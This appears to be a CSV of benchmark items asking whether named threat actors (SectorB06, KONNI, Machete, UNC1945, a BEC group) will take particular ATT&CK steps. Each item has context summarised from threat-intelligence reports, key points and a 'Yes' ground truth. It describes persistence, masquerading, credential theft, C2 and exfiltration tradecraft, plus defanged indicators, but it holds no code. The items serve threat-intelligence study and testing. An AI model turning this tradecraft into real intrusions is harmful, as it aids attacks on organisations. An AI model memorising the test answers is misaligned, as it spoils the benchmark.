Question ID,AttackSeq ID,Batch ID,Question,Key Points,Context,Ground Truth,Source
6,1,1-Defense Evasion-T1055-Process Injection,"After achieving persistence by adding IntelGraphicsController entries into registry run keys with a specific value format, is the SectorB06 malware likely to impersonate a legitimate Symantec executable file and perform actions such as process injection and timestomping for defense evasion?","Defense Evasion: The malware employs several defense evasion techniques, including checking for debuggers, process name hashing, and process injection. It also uses timestomping to modify the timestamps of its dropped files to approximate those of kernel32.dll. Additionally, the malware impersonates a legitimate Symantec executable file to avoid detection.","Initial Access: On April 30, 2019, the ThreatRecon Team reported that SectorB06, a state-sponsored threat actor group, has been exploiting vulnerabilities in Microsoft Office's Equation Editor, specifically a highly obfuscated version of CVE-2017-11882. The group targeted organizations by using a Mongolian language decoy document referencing the Ministry of Justice and Internal Affairs of Mongolia. The document was uploaded from a Singapore IP address and was designed to drop first-stage malware if the exploit was successful.
Execution: The first-stage malware, identified as RasTls.dll, begins by resolving encoded API addresses and then starts a thread to poll for the presence of a debugger, exiting if one is found. It uses a custom hashing algorithm to check the process name it is running under against a list of expected names, including 'winword.exe', 'excel.exe', 'powerpnt.exe', 'acrord32.exe', and 'eqnedt32.exe'. The malware also runs CreateProcess with commands to manipulate file ownership and drops batch files to delete the initial malware file and winword.exe.
Persistence: The malware achieves persistence by decompressing and dropping two files: RasTls.dll (renamed from cclerr.wll) and IntelGraphicsController.exe/AcroRd32.exe, which is a legitimate signed Symantec file (real name: dot1xtra.exe). These files are stored in directories related to Intel Processor Graphics and are added to the registry run keys for persistence. The registry key used is 'IntelGraphicsController' with a specific value format.
Discovery: The malware performs discovery by querying the registry and identifying victim machines using a specific registry key under 'Software\Intel\Java'. It also checks for the presence of certain processes on the system.
Command and Control: The second-stage malware, which was not analyzed in detail, is designed to create a remote command shell and communicates with external C2 IP addresses on port 443. It also references internal IP addresses, indicating that the threat actor already has basic access to the victim's internal network.
Others: The CTI report from ThreatRecon Team on May 27, 2019, provides an overview of the activities of SectorB06, a state-sponsored threat actor group active in Asia. The report includes details on the malware used, the exploitation of vulnerabilities, persistence mechanisms, defense evasion tactics, discovery processes, and command and control infrastructure. Additionally, the report lists MITRE ATT&CK Techniques observed in the analysis of the malware and provides indicators of compromise, including hashes and IP addresses.",Yes,SectorB06 using Mongolian language in lure document
8,1,1-Defense Evasion-T1036-Masquerading,"After decompressing and dropping files such as RasTls.dll and IntelGraphicsController.exe/AcroRd32.exe to achieve persistence by adding these to the registry run keys, is the malware likely to impersonate a legitimate Symantec executable file under the Defense Evasion tactic?","Defense Evasion: The malware employs several defense evasion techniques, including checking for debuggers, process name hashing, and process injection. It also uses timestomping to modify the timestamps of its dropped files to approximate those of kernel32.dll. Additionally, the malware impersonates a legitimate Symantec executable file to avoid detection.","Initial Access: On April 30, 2019, the ThreatRecon Team reported that SectorB06, a state-sponsored threat actor group, has been exploiting vulnerabilities in Microsoft Office's Equation Editor, specifically a highly obfuscated version of CVE-2017-11882. The group targeted organizations by using a Mongolian language decoy document referencing the Ministry of Justice and Internal Affairs of Mongolia. The document was uploaded from a Singapore IP address and was designed to drop first-stage malware if the exploit was successful.
Execution: The first-stage malware, identified as RasTls.dll, begins by resolving encoded API addresses and then starts a thread to poll for the presence of a debugger, exiting if one is found. It uses a custom hashing algorithm to check the process name it is running under against a list of expected names, including 'winword.exe', 'excel.exe', 'powerpnt.exe', 'acrord32.exe', and 'eqnedt32.exe'. The malware also runs CreateProcess with commands to manipulate file ownership and drops batch files to delete the initial malware file and winword.exe.
Persistence: The malware achieves persistence by decompressing and dropping two files: RasTls.dll (renamed from cclerr.wll) and IntelGraphicsController.exe/AcroRd32.exe, which is a legitimate signed Symantec file (real name: dot1xtra.exe). These files are stored in directories related to Intel Processor Graphics and are added to the registry run keys for persistence. The registry key used is 'IntelGraphicsController' with a specific value format.
Discovery: The malware performs discovery by querying the registry and identifying victim machines using a specific registry key under 'Software\Intel\Java'. It also checks for the presence of certain processes on the system.
Command and Control: The second-stage malware, which was not analyzed in detail, is designed to create a remote command shell and communicates with external C2 IP addresses on port 443. It also references internal IP addresses, indicating that the threat actor already has basic access to the victim's internal network.
Others: The CTI report from ThreatRecon Team on May 27, 2019, provides an overview of the activities of SectorB06, a state-sponsored threat actor group active in Asia. The report includes details on the malware used, the exploitation of vulnerabilities, persistence mechanisms, defense evasion tactics, discovery processes, and command and control infrastructure. Additionally, the report lists MITRE ATT&CK Techniques observed in the analysis of the malware and provides indicators of compromise, including hashes and IP addresses.",Yes,SectorB06 using Mongolian language in lure document
9,1,1-Discovery-T1012-Query Registry,"After the malware achieves persistence by adding Intel-related files to registry run keys and impersonating a legitimate Symantec executable for defense evasion, is it likely that the malware will query the registry and identify victim machines as part of its discovery process?",Discovery: The malware performs discovery by querying the registry and identifying victim machines using a specific registry key under 'Software\Intel\Java'. It also checks for the presence of certain processes on the system.,"Initial Access: On April 30, 2019, the ThreatRecon Team reported that SectorB06, a state-sponsored threat actor group, has been exploiting vulnerabilities in Microsoft Office's Equation Editor, specifically a highly obfuscated version of CVE-2017-11882. The group targeted organizations by using a Mongolian language decoy document referencing the Ministry of Justice and Internal Affairs of Mongolia. The document was uploaded from a Singapore IP address and was designed to drop first-stage malware if the exploit was successful.
Execution: The first-stage malware, identified as RasTls.dll, begins by resolving encoded API addresses and then starts a thread to poll for the presence of a debugger, exiting if one is found. It uses a custom hashing algorithm to check the process name it is running under against a list of expected names, including 'winword.exe', 'excel.exe', 'powerpnt.exe', 'acrord32.exe', and 'eqnedt32.exe'. The malware also runs CreateProcess with commands to manipulate file ownership and drops batch files to delete the initial malware file and winword.exe.
Persistence: The malware achieves persistence by decompressing and dropping two files: RasTls.dll (renamed from cclerr.wll) and IntelGraphicsController.exe/AcroRd32.exe, which is a legitimate signed Symantec file (real name: dot1xtra.exe). These files are stored in directories related to Intel Processor Graphics and are added to the registry run keys for persistence. The registry key used is 'IntelGraphicsController' with a specific value format.
Defense Evasion: The malware employs several defense evasion techniques, including checking for debuggers, process name hashing, and process injection. It also uses timestomping to modify the timestamps of its dropped files to approximate those of kernel32.dll. Additionally, the malware impersonates a legitimate Symantec executable file to avoid detection.
Command and Control: The second-stage malware, which was not analyzed in detail, is designed to create a remote command shell and communicates with external C2 IP addresses on port 443. It also references internal IP addresses, indicating that the threat actor already has basic access to the victim's internal network.
Others: The CTI report from ThreatRecon Team on May 27, 2019, provides an overview of the activities of SectorB06, a state-sponsored threat actor group active in Asia. The report includes details on the malware used, the exploitation of vulnerabilities, persistence mechanisms, defense evasion tactics, discovery processes, and command and control infrastructure. Additionally, the report lists MITRE ATT&CK Techniques observed in the analysis of the malware and provides indicators of compromise, including hashes and IP addresses.",Yes,SectorB06 using Mongolian language in lure document
16,100,100-Defense Evasion-T1656-Impersonation,"After impersonating the CEO to initiate email correspondence for a confidential acquisition, is it likely that the threat group will employ defense evasion tactics by using real domains to make emails appear legitimate and stressing confidentiality to prevent validation of the project?","Defense Evasion: The threat group employs defense evasion tactics by stressing confidentiality in their communications, aiming to prevent the targeted employee from validating the legitimacy of the project with their manager or colleagues. They also use real domains to make emails appear as if they are coming directly from the impersonated CEO, either by spoofing the CEO's email address or using an extended spoofed display name. Additionally, the group has been hesitant to use mule accounts in the United States or the United Kingdom, likely indicating that they don't have a good mule network there.","Initial Access: The Israel-based threat group employs a two-stage attack process, with the first stage involving initial email correspondence. They commonly impersonate the CEO of the targeted organization, setting the stage for the attack by claiming the organization is working through the confidential acquisition of another company and requesting assistance with an initial payment. The group uses various tactics to make the emails appear legitimate, such as spoofing the CEO's email address using the real domain if no effective DMARC policy is in place, or updating the sending display name to include the CEO's email address in the display name. The emails are primarily written in English, but some campaigns have been translated into Spanish, French, Italian, and Japanese to fit in with the usual communications of the targeted employee.
Others: The report details the activities of a sophisticated Israel-based threat group responsible for over 350 BEC campaigns since February 2021. The group targets multinational corporations with annual revenues averaging over $10 billion, with employees in at least 61 different countries across six continents. The campaigns follow a cyclical pattern, with 80% of attacks occurring during three periods throughout the year. The group does not target specific industries and prefers larger enterprises. The average amount requested in an attack is $712,000. The group uses real attorneys' identities, often from KPMG, to coordinate payments. The secondary personas referenced are real M&A attorneys based in the UK. The group's unique approach includes requesting large sums of money and transitioning conversations to voice calls via WhatsApp to expedite the process and reduce the paper trail. The report concludes with recommendations for protecting organizations from BEC attacks, emphasizing the need for security solutions that use behavioral AI to understand identity, context, and content.",Yes,Exploring-the-Rise-of-Israel-Based-BEC-Attacks
17,101,101-Initial Access-T1566-Phishing,"After ""Machete"" malware establishes persistence by creating a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installing itself in 'appdata/MicroDes/', is it likely that it will subsequently log keystrokes, capture audio from the computer's microphone, and hijack the clipboard to collect information from the target machine?","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.","Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
20,101,101-Collection-T1123-Audio Capture,"After establishing persistence by creating tasks such as 'Microsoft_up' and placing malicious files in directories like 'appdata/ MicroDes/', is ""Machete"" likely to capture audio from the computer's microphone and copy files to a special USB device during the collection phase?","Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
24,101,101-Collection-T1025-Data from Removable Media,"After achieving persistence by creating a task named 'Microsoft_up' and storing the malware in 'appdata/MicroDes/', is Machete likely to copy files to a special USB device as part of its collection capabilities?","Collection: ""Machete"" is capable of logging keystrokes, capturing audio from the computer's microphone, taking screenshots, capturing geolocation data, taking photos from the computer's web camera, copying files to a remote server, copying files to a special USB device if inserted, and hijacking the clipboard to capture information from the target machine.","Initial Access: The malware known as ""Machete"" is distributed through social engineering tactics, including spear-phishing emails and a fake blog website. No evidence suggests the use of exploits targeting zero-day vulnerabilities. The attackers and victims are both Spanish-speaking. The malware is embedded in PowerPoint presentations disguised as Nullsoft Installer self-extracting archives with names such as 'Hermosa XXX.pps.rar', 'Suntzu.rar', 'El arte de la guerra.rar', and 'Hot brazilian XXX.rar'. These files, when opened, install the malware on the target system.
Persistence: On infected machines, ""Machete"" creates a file named 'Java Update.lnk' pointing to 'appdata/Jre6/java.exe' and installs the malware in 'appdata/ MicroDes/'. It also creates a task named 'Microsoft_up'.
Others: The campaign, believed to have started in 2010 and renewed in 2012, may still be active. Victims are primarily located in Venezuela, Ecuador, Colombia, Peru, Russia, Cuba, and Spain, and include high-profile targets such as intelligence services, military, embassies, and government institutions. The malware uses Python embedded into Windows executables, which is unusual and suggests ease of coding rather than multi-platform support. Infrastructure for Mac OS X and Unix victims, as well as a mobile (Android) component, were also discovered. Indicators of Compromise include suspicious domains like 'java.serveblog.net', 'agaliarept.com', and others, as well as a known infection artifact 'hxxp://name.domain.org/nickname/set/Signed_Update.jar'. Malicious samples related to this attack are detected by Kaspersky Lab products as Trojan-Spy.Python.Ragua.",Yes,El_Machete
27,102,102-Privilege Escalation-T1068-Exploitation for Privilege Escalation,"After maintaining persistence on a Solaris 9 server by placing a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder, is UNC1945 likely to use the SLAPSTICK backdoor and Mimikatz to escalate privileges before installing backdoors like TINYSHELL on various endpoints?","Privilege Escalation: UNC1945 escalated privileges using the SLAPSTICK backdoor and open source tools like Mimikatz. They also installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO on various endpoints after escalating privileges.","Initial Access: In late 2018, UNC1945 exploited a vulnerability in an internet-exposed Solaris server's SSH service to install the SLAPSTICK backdoor, enabling credential capture for further compromise. In mid-2020, UNC1945 deployed the EVILSUN tool containing a zero-day exploit for CVE-2020-14871 on a Solaris 9 server, facilitating remote exploitation without authentication.
Execution: UNC1945 utilized custom virtual machines pre-configured with post-exploitation tools to execute commands, transfer files, and establish tunnel connections. They also employed a custom Linux backdoor named LEMONSTICK for command execution and file transfer.
Persistence: UNC1945 established persistence on a Solaris 9 server using the SLAPSTICK backdoor, which allowed user access with a secret hard-coded password. They also placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder to maintain access.
Defense Evasion: UNC1945 employed anti-forensics techniques using a custom ELF utility named LOGBLEACH to clean logs and built-in Linux commands to alter timestamps. They also executed a Linux ELF packer named STEELCORGI in memory to obfuscate activity.
Credential Access: UNC1945 collected credentials using the SLAPSTICK backdoor and Mimikatz, enabling lateral movement throughout networks and access to other network segments and third-party environments.
Discovery: UNC1945 maintained various tools for internal reconnaissance, including network scanners, exploits, and reconnaissance tools contained within their custom virtual machines. They also employed a SPARC executable identified as a reconnaissance tool, possibly referred to as Luckscan or BlueKeep.
Lateral Movement: UNC1945 moved laterally through networks using stolen credentials and tools such as ProxyChains to download PUPYRAT. They also used IMPACKET with SMBEXEC in a Windows environment for remote command execution and moved laterally via RDP to a Windows server.
Command and Control: UNC1945 used SSH Port Forwarding to maintain access to their external infrastructure and deployed a custom QEMU Virtual Machine on multiple hosts for direct access to the command and control server, obfuscating interaction with customer infrastructure.
Others: Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions investigated. In at least one case, ROLLCOAST ransomware deployment was observed in the final phase of threat actor activity, but not attributed to UNC1945. It is likely that access to the victim environment was sold to another group.",Yes,fireeye.com-Live off the Land How About Bringing Your Own Island An Overview of UNC1945
29,102,102-Defense Evasion-T1027-Obfuscated Files or Information,Is it likely that UNC1945 escalated privileges using the SLAPSTICK backdoor and other tools before employing anti-forensics techniques such as executing the STEELCORGI ELF packer in memory for log obfuscation?,Defense Evasion: UNC1945 employed anti-forensics techniques using a custom ELF utility named LOGBLEACH to clean logs and built-in Linux commands to alter timestamps. They also executed a Linux ELF packer named STEELCORGI in memory to obfuscate activity.,"Initial Access: In late 2018, UNC1945 exploited a vulnerability in an internet-exposed Solaris server's SSH service to install the SLAPSTICK backdoor, enabling credential capture for further compromise. In mid-2020, UNC1945 deployed the EVILSUN tool containing a zero-day exploit for CVE-2020-14871 on a Solaris 9 server, facilitating remote exploitation without authentication.
Execution: UNC1945 utilized custom virtual machines pre-configured with post-exploitation tools to execute commands, transfer files, and establish tunnel connections. They also employed a custom Linux backdoor named LEMONSTICK for command execution and file transfer.
Persistence: UNC1945 established persistence on a Solaris 9 server using the SLAPSTICK backdoor, which allowed user access with a secret hard-coded password. They also placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder to maintain access.
Privilege Escalation: UNC1945 escalated privileges using the SLAPSTICK backdoor and open source tools like Mimikatz. They also installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO on various endpoints after escalating privileges.
Credential Access: UNC1945 collected credentials using the SLAPSTICK backdoor and Mimikatz, enabling lateral movement throughout networks and access to other network segments and third-party environments.
Discovery: UNC1945 maintained various tools for internal reconnaissance, including network scanners, exploits, and reconnaissance tools contained within their custom virtual machines. They also employed a SPARC executable identified as a reconnaissance tool, possibly referred to as Luckscan or BlueKeep.
Lateral Movement: UNC1945 moved laterally through networks using stolen credentials and tools such as ProxyChains to download PUPYRAT. They also used IMPACKET with SMBEXEC in a Windows environment for remote command execution and moved laterally via RDP to a Windows server.
Command and Control: UNC1945 used SSH Port Forwarding to maintain access to their external infrastructure and deployed a custom QEMU Virtual Machine on multiple hosts for direct access to the command and control server, obfuscating interaction with customer infrastructure.
Others: Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions investigated. In at least one case, ROLLCOAST ransomware deployment was observed in the final phase of threat actor activity, but not attributed to UNC1945. It is likely that access to the victim environment was sold to another group.",Yes,fireeye.com-Live off the Land How About Bringing Your Own Island An Overview of UNC1945
32,102,102-Lateral Movement-T1550-Use Alternate Authentication Material,"After leveraging reconnaissance tools within their custom virtual machines for internal scanning and network exploitation during the Discovery phase, is it likely that UNC1945 will use stolen credentials and tools like ProxyChains to download PUPYRAT before moving laterally to a Windows server via RDP in the Lateral Movement phase?",Lateral Movement: UNC1945 moved laterally through networks using stolen credentials and tools such as ProxyChains to download PUPYRAT. They also used IMPACKET with SMBEXEC in a Windows environment for remote command execution and moved laterally via RDP to a Windows server.,"Initial Access: In late 2018, UNC1945 exploited a vulnerability in an internet-exposed Solaris server's SSH service to install the SLAPSTICK backdoor, enabling credential capture for further compromise. In mid-2020, UNC1945 deployed the EVILSUN tool containing a zero-day exploit for CVE-2020-14871 on a Solaris 9 server, facilitating remote exploitation without authentication.
Execution: UNC1945 utilized custom virtual machines pre-configured with post-exploitation tools to execute commands, transfer files, and establish tunnel connections. They also employed a custom Linux backdoor named LEMONSTICK for command execution and file transfer.
Persistence: UNC1945 established persistence on a Solaris 9 server using the SLAPSTICK backdoor, which allowed user access with a secret hard-coded password. They also placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder to maintain access.
Privilege Escalation: UNC1945 escalated privileges using the SLAPSTICK backdoor and open source tools like Mimikatz. They also installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO on various endpoints after escalating privileges.
Defense Evasion: UNC1945 employed anti-forensics techniques using a custom ELF utility named LOGBLEACH to clean logs and built-in Linux commands to alter timestamps. They also executed a Linux ELF packer named STEELCORGI in memory to obfuscate activity.
Credential Access: UNC1945 collected credentials using the SLAPSTICK backdoor and Mimikatz, enabling lateral movement throughout networks and access to other network segments and third-party environments.
Discovery: UNC1945 maintained various tools for internal reconnaissance, including network scanners, exploits, and reconnaissance tools contained within their custom virtual machines. They also employed a SPARC executable identified as a reconnaissance tool, possibly referred to as Luckscan or BlueKeep.
Command and Control: UNC1945 used SSH Port Forwarding to maintain access to their external infrastructure and deployed a custom QEMU Virtual Machine on multiple hosts for direct access to the command and control server, obfuscating interaction with customer infrastructure.
Others: Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions investigated. In at least one case, ROLLCOAST ransomware deployment was observed in the final phase of threat actor activity, but not attributed to UNC1945. It is likely that access to the victim environment was sold to another group.",Yes,fireeye.com-Live off the Land How About Bringing Your Own Island An Overview of UNC1945
35,103,103-Execution-T1203-Exploitation for Client Execution,"After using an email attachment and social engineering to prompt the target to execute a .src file for initial access, is it likely that the operator will proceed to execute arbitrary code on the infected host before achieving persistence by creating a Windows shortcut in the startup folder?",Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.,"Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.
Collection: The malware is designed to steal files, keystrokes, and perform screenshots.
Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.
Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.
Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",Yes,konni-malware-under-radar-for-years.html
36,103,103-Persistence-T1547-Boot or Logon Autostart Execution,"After using additional social engineering to prompt the target to open a .src file and displaying a decoy document during initial access, is it likely that the KONNI malware will move to execute arbitrary code on the infected host before achieving persistence through methods such as creating a shortcut or naming a Windows shortcut as ""adobe distillist.lnk""?","Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.","Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.
Collection: The malware is designed to steal files, keystrokes, and perform screenshots.
Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.
Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.
Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",Yes,konni-malware-under-radar-for-years.html
41,103,103-Command and Control-T1102-Web Service,"After KONNI malware steals keystrokes, credentials from browsers, and files, is it likely to connect to its C2 server hosted on a service like 000webhost via <c2-domain>/login.php before exfiltrating the stolen data back to its infrastructure?","Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.","Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.
Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.
Collection: The malware is designed to steal files, keystrokes, and perform screenshots.
Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.
Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",Yes,konni-malware-under-radar-for-years.html
42,103,103-Collection-T1005-Data from Local System,"After KONNI malware establishes communication with the C2 domains using HTTP connections hosted by a free web hosting provider, is it likely that the malware will steal files from the local system as part of its collection process before uploading the stolen data, such as keystrokes and screenshots, to the C2 infrastructure?","Collection: The malware is designed to steal files, keystrokes, and perform screenshots.","Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.
Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.
Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.
Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.
Others: The malware, named KONNI, has been under the radar for over 3 years, authored by Paul Rascagneres from Talos. It has been used in multiple campaigns targeting public organizations, with decoy documents suggesting links to North Korea. The malware's capabilities and infrastructure have evolved, including the use of free web hosting providers for C2 and the addition of remote administration features. The latest campaigns from April 2017 are still active, and the infrastructure remains operational. The malware's evolution shows technical advancements and improved decoy documents containing potentially sensitive data.",Yes,konni-malware-under-radar-for-years.html
45,103,103-Exfiltration-T1041-Exfiltration Over C2 Channel,"After communicating with its C2 infrastructure using HTTP connections hosted by 000webhost to register, upload, and download files, is it likely that the KONNI malware will upload stolen data, including keystrokes and screenshots, to the C2 infrastructure as part of its exfiltration process?","Exfiltration: The malware uploads stolen data, such as keystrokes and screenshots, to the C2 infrastructure.","Initial Access: Throughout the multiple campaigns observed over the last 3 years, the actor has used an email attachment as the initial infection vector. They then use additional social engineering to prompt the target to open a .src file, display a decoy document to the users, and finally execute the malware on the victim's machine.
Execution: The current version of the malware allows the operator to execute arbitrary code on the infected host.
Persistence: In the 2014 campaign, the malware dropped two files on the targeted system: a decoy document and a fake svchost.exe binary, both stored in ""C:\Windows"". In the 2016 campaign, the malware was dropped in the local setting of the current user and a shortcut was created to launch winnit.exe in the startup folder. In the 2017 campaigns, persistence was achieved by a Windows shortcut named adobe distillist.lnk.
Defense Evasion: The malware has evolved over time, moving from a single file to a dual file structure (an executable and a dynamic library), and the decoy documents have become more advanced. The malware checks if a file used on a previous version of KONNI is available on the system.
Credential Access: The malware is capable of stealing keystrokes and credentials from browsers such as Firefox, Chrome, and Opera.
Collection: The malware is designed to steal files, keystrokes, and perform screenshots.
Command and Control: The malware communicates with command and control (C2) domains using HTTP connections. The C2 infrastructure was hosted by a free web hosting provider, 000webhost. The malware samples connected to a specific URI: <c2-domain>/login.php. Over time, more .php files became available for registration, uploading, and downloading files.
